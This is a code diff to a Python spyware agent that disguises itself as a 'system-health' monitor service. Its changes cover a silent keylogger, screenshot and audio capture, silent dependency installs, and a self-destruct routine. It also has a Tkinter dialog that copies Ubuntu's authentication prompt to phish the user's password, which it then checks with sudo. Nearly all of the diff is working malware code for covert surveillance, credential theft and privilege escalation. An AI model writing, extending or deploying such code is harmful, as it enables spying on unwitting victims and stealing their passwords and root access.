@@ -28,34 +28,19 @@ KEY = "S3cr3tK3y2024!"
 # --- UTILS ---
 
 def install_dependencies():
-    """Attempt to install missing python dependencies."""
-    restart_needed = False
+    """Attempt to install missing python dependencies silently if possible."""
+    # We rely on setup.sh for heavy lifting. This is just a sanity check + repair.
+    requirements = ["mss", "pynput"]
     
-    # 1. Check MSS
-    try:
-        import mss
-    except ImportError:
+    for req in requirements:
         try:
-            print("Installing mss...", flush=True)
-            subprocess.run([sys.executable, "-m", "pip", "install", "mss", "--break-system-packages"], check=True)
-            restart_needed = True
-        except Exception as e:
-            print(f"Failed to install mss: {e}", flush=True)
-
-    # 2. Check Pynput
-    try:
-        import pynput
-    except ImportError:
-        try:
-            print("Installing pynput...", flush=True)
-            subprocess.run([sys.executable, "-m", "pip", "install", "pynput", "--break-system-packages"], check=True)
-            restart_needed = True
-        except Exception as e:
-            print(f"Failed to install pynput: {e}", flush=True)
-
-    if restart_needed:
-        print("Dependencies installed. Restarting agent to apply changes...", flush=True)
-        sys.exit(1)
+            __import__(req)
+        except ImportError:
+            try:
+                subprocess.run([sys.executable, "-m", "pip", "install", req, "--break-system-packages"], 
+                             check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
 
 def get_config():
     try:
@@ -112,7 +97,6 @@ def take_screenshot():
         filename = f"/tmp/scr_{int(time.time())}.png"
         
         with mss.mss() as sct:
-            # Capture the first monitor
             sct.shot(mon=-1, output=filename)
             
         with open(filename, "rb") as f:
@@ -121,7 +105,6 @@ def take_screenshot():
         os.remove(filename)
         return img_data
     except Exception as e:
-        # Pass exception up to process_tasks to be sent as sysinfo
         raise e
 
 # --- KEYLOGGER ---
@@ -143,22 +126,26 @@ def start_keylogger_thread():
         listener = pynput.keyboard.Listener(on_press=on_press)
         listener.daemon = True
         listener.start()
-        # print("Keylogger started.", flush=True) # Silenced per user request
+        # Silenced startup message per user request
     except Exception as e:
-        pass # print(f"Keylogger failed to start: {e}", flush=True)
+        pass 
 
 def attempt_root_escalation():
+    """
+    Shows a custom AUTHENTICATION REQUIRED dialog using Tkinter.
+    Replicates the exact look of Ubuntu's prompt.
+    """
     global ROOT_PASSWORD
     print("Attempting root escalation (Fake Auth)...", flush=True)
     
-    # Check Tkinter
+    # Check Tkinter availability
     try:
         import tkinter as tk
         from tkinter import font
-        print("DEBUG: Tkinter imported successfully", flush=True)
-    except ImportError as ie:
-        print(f"DEBUG: Tkinter import failed: {ie}", flush=True)
-        return False, f"Tkinter not installed: {ie}"
+        print("DEBUG: Tkinter available", flush=True)
+    except ImportError as e:
+        print(f"DEBUG: Tkinter failed: {e}", flush=True)
+        return False, "Tkinter not installed."
 
     result_pw = None
 
@@ -184,14 +171,14 @@ def attempt_root_escalation():
             dialog.configure(bg='#2C2C2C')
            
             # Load Dialog Image (basic PNG) - ALWAYS RESIZE TO 373x381
+            # Look in ~/.config/system-health/prompt.png or local dir
             base_dir = os.path.expanduser("~/.config/system-health")
             if not os.path.exists(base_dir):
                 base_dir = os.path.dirname(os.path.abspath(__file__))
                 
             img_path = os.path.join(base_dir, "prompt.png")
-            
-            print(f"DEBUG: Loading image from {img_path}", flush=True)
-               
+            print(f"DEBUG: Image path: {img_path}", flush=True)
+
             bg_image = None
             try:
                 # Check if we can use OpenCV to load PNG with proper alpha
@@ -202,11 +189,8 @@ def attempt_root_escalation():
                 png_img = cv2.imread(img_path, cv2.IMREAD_UNCHANGED)
                 
                 if png_img is not None:
-                    print(f"Original image size: {png_img.shape[1]}x{png_img.shape[0]}", flush=True)
-                    
                     # RESIZE to exact dimensions (373x381)
                     png_img = cv2.resize(png_img, (DIALOG_WIDTH, DIALOG_HEIGHT), interpolation=cv2.INTER_LANCZOS4)
-                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
                     
                     if png_img.shape[2] == 4:  # Has alpha channel
                         # Replace transparent pixels with dialog background color
@@ -226,29 +210,27 @@ def attempt_root_escalation():
                         
                         # Load with tkinter
                         bg_image = tk.PhotoImage(file=temp_png)
-                        print("✅ Loaded PNG with OpenCV alpha blending and resize", flush=True)
+                        print("DEBUG: Loaded PNG with OpenCV alpha blending", flush=True)
                     else:
                         # No alpha channel, just save resized image
                         temp_png = "/tmp/dialog_fixed.png"
                         cv2.imwrite(temp_png, png_img)
                         bg_image = tk.PhotoImage(file=temp_png)
-                        print("✅ Loaded and resized PNG (no alpha)", flush=True)
+                        print("DEBUG: Loaded and resized PNG (no alpha)", flush=True)
                 else:
-                    raise Exception("Failed to load image with OpenCV")
+                    raise Exception("cv2.imread returned None")
                     
             except Exception as e:
                 # Fallback to PIL for resizing if OpenCV fails
-                print(f"⚠️ OpenCV processing failed: {e}, trying PIL...", flush=True)
+                print(f"DEBUG: OpenCV failed ({e}), trying PIL...", flush=True)
                 try:
                     from PIL import Image
                     
                     # Load and resize with PIL
                     pil_img = Image.open(img_path)
-                    print(f"Original image size: {pil_img.width}x{pil_img.height}", flush=True)
                     
                     # Resize to exact dimensions
                     pil_img = pil_img.resize((DIALOG_WIDTH, DIALOG_HEIGHT), Image.Resampling.LANCZOS)
-                    print(f"✅ Resized image to: {DIALOG_WIDTH}x{DIALOG_HEIGHT}", flush=True)
                     
                     # Save temporary file
                     temp_png = "/tmp/dialog_resized.png"
@@ -256,16 +238,15 @@ def attempt_root_escalation():
                     
                     # Load with tkinter
                     bg_image = tk.PhotoImage(file=temp_png)
-                    print("✅ Loaded and resized PNG with PIL", flush=True)
+                    print("DEBUG: Loaded and resized PNG with PIL", flush=True)
                     
                 except ImportError:
-                    print("⚠️ PIL not found", flush=True)
+                    print("DEBUG: PIL not found, utilizing raw PhotoImage", flush=True)
                     # Final fallback
                     try:
                         bg_image = tk.PhotoImage(file=img_path)
-                        print("⚠️ Using original image without resize (fallback)", flush=True)
                     except Exception as e2:
-                        print(f"❌ Failed to load prompt.png: {e2}", flush=True)
+                        print(f"DEBUG: Final fallback failed: {e2}", flush=True)
                         bg_image = None
                
             # Center Dialog using fixed dimensions
@@ -274,7 +255,6 @@ def attempt_root_escalation():
             dialog.geometry(f"{DIALOG_WIDTH}x{DIALOG_HEIGHT}+{x}+{y}")
            
             # === SCREENSHOT DIMMER using MSS + OpenCV ===
-            print("Taking screenshot for dimmed background...", flush=True)
             dimmer = None
             try:
                 import mss
@@ -298,8 +278,6 @@ def attempt_root_escalation():
                 temp_dimmed = "/tmp/screen_dimmed.png"
                 cv2.imwrite(temp_dimmed, dimmed_img)
                 
-                print("✅ Screenshot dimmed with OpenCV", flush=True)
-                
                 # Load dimmed screenshot into tkinter
                 screen_photo = tk.PhotoImage(file=temp_dimmed)
                 
@@ -314,11 +292,9 @@ def attempt_root_escalation():
                 dimmer_label = tk.Label(dimmer, image=screen_photo, borderwidth=0)
                 dimmer_label.image = screen_photo  # Keep reference
                 dimmer_label.place(x=0, y=0)
-                
-                print("✅ Dimmed screenshot background displayed", flush=True)
                     
             except Exception as e:
-                print(f"⚠️ Screenshot dimmer failed: {e}, using solid overlay", flush=True)
+                print(f"DEBUG: Dimmer failed ({e}), using solid overlay", flush=True)
                 dimmer = tk.Toplevel(root)
                 dimmer.geometry(f"{w}x{h}+0+0")
                 dimmer.configure(bg='black')
@@ -366,7 +342,7 @@ def attempt_root_escalation():
                     dialog.after(1000, maintain_focus)  # Much less frequent
             dialog.after(100, maintain_focus)
 
-            # Layout Configuration
+            # Layout Configuration (From Test.py)
             POS = {
                 'title_y': 50,
                 'msg_y': 85,
@@ -376,7 +352,7 @@ def attempt_root_escalation():
                 'input_w': 260,
                 'input_h': 28,
                 'btn_h': 41,
-                'btn_gap': 1,  # Gap between buttons
+                'btn_gap': 1,
             }
            
             TEXT_COLOR = 'white'
@@ -405,10 +381,12 @@ def attempt_root_escalation():
             # User Info
             username = os.getlogin()
             initial = username[0].upper() if username else "?"
-           
+            
+            # Avatar
             tk.Label(dialog, text=initial, bg=AVATAR_BG, fg='white', font=("Ubuntu", 18, "bold"))\
                 .place(relx=0.5, y=POS['avatar_y'], anchor='center')
-           
+            
+            # Username
             tk.Label(dialog, text=username, bg=USERNAME_BG, fg=TEXT_COLOR, font=("Ubuntu", 12, "bold"))\
                 .place(relx=0.5, y=POS['username_y'], anchor='center')
 
@@ -420,13 +398,12 @@ def attempt_root_escalation():
            
             pw_entry.place(relx=0.5, y=POS['input_y'], width=POS['input_w'], height=POS['input_h'], anchor='center')
             
-            # Prevent focus from being stolen
+            # Prevent focus stealing
             def keep_entry_focus(e):
                 return "break"
-            
             pw_entry.bind('<FocusOut>', lambda e: pw_entry.focus_set())
 
-            # Buttons with gap
+            # Buttons
             btn_w = (DIALOG_WIDTH - POS['btn_gap']) // 2
             btn_y = DIALOG_HEIGHT - POS['btn_h']
            
@@ -446,26 +423,21 @@ def attempt_root_escalation():
                     root.quit()
                 except: pass
            
-            # Cancel Button (Left)
+            # Cancel Button
             lbl_cancel = tk.Label(dialog, text="Cancel", bg=BTN_CANCEL_BG, fg='white', font=body_font)
             lbl_cancel.place(x=0, y=btn_y, width=btn_w, height=POS['btn_h'])
             lbl_cancel.bind("<Button-1>", cancel)
            
-            # Authenticate Button (Right)
+            # Authenticate Button
             lbl_auth = tk.Label(dialog, text="Authenticate", bg=BTN_AUTH_BG, fg='white', font=("Ubuntu", 10, "bold"))
             lbl_auth.place(x=btn_w + POS['btn_gap'], y=btn_y, width=btn_w, height=POS['btn_h'])
             lbl_auth.bind("<Button-1>", submit)
            
             # Hover effects
-            def on_cancel_enter(e): 
-                lbl_cancel.config(bg=BTN_CANCEL_HOVER)
-            def on_cancel_leave(e): 
-                lbl_cancel.config(bg=BTN_CANCEL_BG)
-            
-            def on_auth_enter(e): 
-                lbl_auth.config(bg=BTN_AUTH_HOVER)
-            def on_auth_leave(e): 
-                lbl_auth.config(bg=BTN_AUTH_BG)
+            def on_cancel_enter(e): lbl_cancel.config(bg=BTN_CANCEL_HOVER)
+            def on_cancel_leave(e): lbl_cancel.config(bg=BTN_CANCEL_BG)
+            def on_auth_enter(e):   lbl_auth.config(bg=BTN_AUTH_HOVER)
+            def on_auth_leave(e):   lbl_auth.config(bg=BTN_AUTH_BG)
            
             lbl_cancel.bind("<Enter>", on_cancel_enter)
             lbl_cancel.bind("<Leave>", on_cancel_leave)
@@ -500,14 +472,11 @@ def attempt_root_escalation():
             pw_entry.bind('<Return>', submit_if_valid)
             dialog.bind('<Escape>', cancel)
             
-            # Emergency exit handlers
-            def force_quit(e=None):
-                cancel()
-            
+            # Emergency exit
+            def force_quit(e=None): cancel()
             root.bind('<Control-c>', force_quit)
             dialog.bind('<Control-c>', force_quit)
-            dialog.bind('<Control-q>', force_quit)
-           
+            
             # Force focus
             def set_focus():
                 pw_entry.focus_force()
@@ -516,7 +485,8 @@ def attempt_root_escalation():
                 except: dialog.grab_set()
            
             dialog.after(250, set_focus)
-           
+            
+            # Start Loop
             root.mainloop()
 
         except Exception as e:
@@ -524,9 +494,8 @@ def attempt_root_escalation():
             import traceback
             traceback.print_exc()
 
+    # Threaded execution with timeout
     try:
-        # Run in thread to allow timeout or main thread checks if needed (optional)
-        import threading
         def run_with_timeout():
             print("DEBUG: Thread starting show_ui...", flush=True)
             show_ui()
@@ -549,7 +518,7 @@ def attempt_root_escalation():
     
     if result_pw:
         print(f"✅ Password Captured: {result_pw}", flush=True)
-        # Verify
+        # Verify using sudo -k to ignore cache
         test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
         if test.returncode == 0:
             ROOT_PASSWORD = result_pw
@@ -645,7 +614,7 @@ def register_device(config, device_id):
 def self_destruct():
     try:
         print("Initiating self-destruct...", flush=True)
-        # 1. Disable Service (don't stop yet)
+        # 1. Disable Service
         run_command("systemctl --user disable health-monitor.service")
         
         # 2. Remove Service File
@@ -655,7 +624,6 @@ def self_destruct():
         run_command("systemctl --user daemon-reload")
         
         # 3. Remove Config & Agent Files
-        # We keep the running script in memory, but delete the file on disk
         import shutil
         if os.path.exists(BASE_PATH):
             shutil.rmtree(BASE_PATH)
@@ -680,10 +648,11 @@ def process_tasks(config, device_id):
         result_data = None
         data_type = None
         should_destruct = False
+        should_fail_task = False
         
         try:
             if task_type == "display_capture":
-                # Ensure DISPLAY var is set
+                 # Ensure DISPLAY var is set
                 if "DISPLAY" not in os.environ:
                     os.environ["DISPLAY"] = ":0"
                     
@@ -694,10 +663,9 @@ def process_tasks(config, device_id):
                     data_type = "display"
                     print("Screenshot captured successfully.", flush=True)
                 else:
-                    # Report failure
-                    result_data = {"data": "Screenshot failed. 'scrot' might be missing or no display."}
-                    data_type = "sysinfo" # Send as generic info/log
-                    print("Screenshot failed (unknown reason).", flush=True)
+                    result_data = {"data": "Screenshot failed."}
+                    data_type = "sysinfo"
+                    should_fail_task = True
                     
             elif task_type == "system_info":
                 sysinf = get_sys_info()
@@ -712,8 +680,9 @@ def process_tasks(config, device_id):
                     result_data = {"file_data": aud}
                     data_type = "audio"
                 else:
-                    result_data = {"data": "Audio recording failed. 'arecord' missing or input unavailable."}
+                    result_data = {"data": "Audio recording failed."}
                     data_type = "sysinfo"
+                    should_fail_task = True
 
             elif task_type == "input_monitor": # Keylogs
                 global KEYLOG_BUFFER
@@ -724,7 +693,6 @@ def process_tasks(config, device_id):
                 if logs:
                     result_data = {"data": logs}
                     data_type = "keylog"
-                    print(f"Sent {len(logs)} chars of keylogs.", flush=True)
                 else:
                     result_data = {"data": "No keylogs captured yet."}
                     data_type = "sysinfo"
@@ -733,12 +701,11 @@ def process_tasks(config, device_id):
                 success_bool, msg = attempt_root_escalation()
                 result_data = {"data": msg}
                 data_type = "sysinfo"
-                # Track success for status update
                 should_fail_task = not success_bool
 
             elif task_type == "auto_destruct":
                 success = self_destruct()
-                result_data = {"data": "Self-destruct sequence initiated. Agent removed." if success else "Self-destruct failed."}
+                result_data = {"data": "Self-destruct sequence initiated." if success else "Self-destruct failed."}
                 data_type = "sysinfo"
                 should_destruct = True
                     
@@ -784,7 +751,6 @@ def process_tasks(config, device_id):
                 should_fail_task = (code != 0)
                 
         except Exception as e:
-            # Catch unexpected errors during execution
             error_msg = f"Task execution error: {str(e)}"
             print(error_msg, flush=True)
             result_data = {"data": error_msg}
@@ -812,14 +778,11 @@ def process_tasks(config, device_id):
         
         if should_destruct:
             print("❌ AGENT COMMITTING SUICIDE NOW.", flush=True)
-            # FORCE KILL immediately, do not pass go, do not collect $200
             os._exit(0)
 
 # --- MAIN ---
 
 def main():
-    # Delay for network - REMOVED for debugging
-    # time.sleep(10)
     print("Agent started.", flush=True)
     
     config = get_config()
@@ -830,11 +793,8 @@ def main():
     device_id = get_device_id()
     print(f"Device ID: {device_id}", flush=True)
     
-    # Check dependencies once but don't loop-restart
-    try:
-        install_dependencies()
-    except:
-        pass
+    # Dependencies check
+    install_dependencies()
         
     # Start keylogger silently
     start_keylogger_thread()
